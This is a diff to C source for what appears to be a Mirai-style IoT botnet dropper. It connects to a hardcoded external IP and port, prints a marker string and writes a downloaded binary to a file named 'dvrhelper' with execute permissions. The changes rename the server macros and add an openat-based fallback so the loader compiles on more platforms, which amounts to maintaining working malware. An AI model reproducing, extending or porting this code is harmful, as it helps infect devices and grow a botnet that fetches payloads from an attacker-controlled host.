@@ -6,8 +6,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define GRPC_SERVER utils_inet_addr(195,209,219,35)
-#define GRPC_PORT 34132
+#define BIN_SERVER utils_inet_addr(195,209,219,35)
+#define BIN_PORT 34132
 
 #define EXEC_MSG            "FmbNet\n"
 #define EXEC_MSG_LEN        7
@@ -36,6 +36,10 @@
 #define SCN(n) ((n) & 0xfffff)
 #else
 #define SCN(n) (n)
+#endif
+
+#ifndef AT_FDCWD
+#define AT_FDCWD (-100)
 #endif
 
 void run(void);
@@ -98,8 +102,8 @@ void run(void)
     write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);
 
     addr.sin_family = AF_INET;
-    addr.sin_port = HTONS(GRPC_PORT);
-    addr.sin_addr.s_addr = GRPC_SERVER;
+    addr.sin_port = HTONS(BIN_PORT);
+    addr.sin_addr.s_addr = BIN_SERVER;
 
     ffd = open("dvrhelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);
 
@@ -233,7 +237,11 @@ int xconnect(int fd, struct sockaddr_in *addr, int len)
 
 int xopen(char *path, int flags, int other)
 {
+#ifdef SYS_open
     return syscall(SCN(SYS_open), path, flags, other);
+#else
+    return syscall(SCN(SYS_openat), AT_FDCWD, path, flags, other);
+#endif
 }
 
 int xclose(int fd)
